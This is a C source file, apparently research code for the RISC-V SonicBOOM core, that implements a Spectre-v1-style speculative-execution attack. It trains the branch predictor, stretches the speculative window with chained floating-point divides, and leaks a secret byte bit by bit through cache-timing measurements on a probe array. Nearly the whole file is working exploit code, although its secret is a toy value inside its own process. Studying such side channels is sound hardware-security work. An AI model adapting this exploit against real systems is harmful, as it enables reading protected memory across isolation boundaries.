#include <stdio.h>
#include <stdint.h> 
#include "cache.h"


#define read_csr(reg) ({ unsigned long __tmp; \
  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
  __tmp; })
#define rdcycle() read_csr(cycle) 

#define TRAIN_TIMES         9    // the predictor in SonicBoom is much more sophisticated, need more training
#define ROUNDS              1    // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS  1   // amount of times to attack the same index
#define SECRET_SZ           1
#define CACHE_HIT_THRESHOLD 40
#define L1_BLOCK_SZ_BYTES   64

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];//16384 = 256*L1_BLOCK_SZ_BYTES
// char* secretString = "LoOkMe|ThisIsT}He[SEcretDatA]~";
// *secREt~
// char* secretString = "*secREt~";
char* secretString = "s";
//* 0010 1010
//s 0b0111 0011
//e 0110 0101
//c 0110 0011
//R 0101 0010
//E 0100 0101
//t 0111 0100
//~ 0111 1110

void maccess(void *p){
  asm volatile ("lb t0, 0(%0)\n"
    :
    : "r" (p)
    : "t0");
}

uint64_t access_time(size_t *addr){
    uint64_t start = rdcycle();
    maccess(addr);
    uint64_t diff = (rdcycle() - start);
    asm volatile("fence"); 
    return diff;
}


void victimFunc(uint64_t idx, uint8_t shift){
    uint8_t dummy = 2;
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz) { // speculative window
        if((array1[idx] >> shift) & 0x1){ 
            maccess(array2);
        }
    }
    dummy = rdcycle();
}
void randomAccess(){
    maccess(array2 + 12*64);
    maccess(array1);
    maccess(array2 + 73*64);
    maccess(array2 + 45*64);
    maccess(array2 + 31*64);
    maccess(array2 + 157*64);
    maccess(array2 + 205*64);
    maccess(array2 + 88*64);
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx, latency;
    uint8_t dummy = 0, mix_i = 0;;
    static uint64_t results[8] = {0};
    printf("the secret key is:'s' (0111 0011) \n", secretString);
    // printf("");
    // printf("bit %d\n",bit);
    for(uint64_t len = 0; len < SECRET_SZ; ++len) {
        for(int bit = 7; bit >= 0; bit--){
            for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
                randomAccess();
                flushCache((uint64_t)array2, sizeof(array2)); 
                for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                    randIdx = atkRound % array1_sz;
                    passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                    passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                    passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx   
                    if(j == 0){//attack round
                        maccess(array2 + 64);
                        maccess(array2 + 192);
                        maccess(array2 + 320);
                    }
                    for(uint64_t k = 0; k < 50; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                    victimFunc(passInIdx,bit); // 1 * L1_BLOCK_SZ_BYTES
                }
            } 
            maccess(array2 + 448); 
            for(uint8_t k = 0; k < 30; ++k) asm("");
            results[bit] =  access_time(array2 + 576);
        }

        printf("latency\tbit\n");
        for(int i=7;i>=0;i--){
            printf("%d\t%d\n",results[i], results[i] < CACHE_HIT_THRESHOLD ? 0 : 1);
        }
        ++attackIdx; // read in the next secret 
    }
    return 0;
}
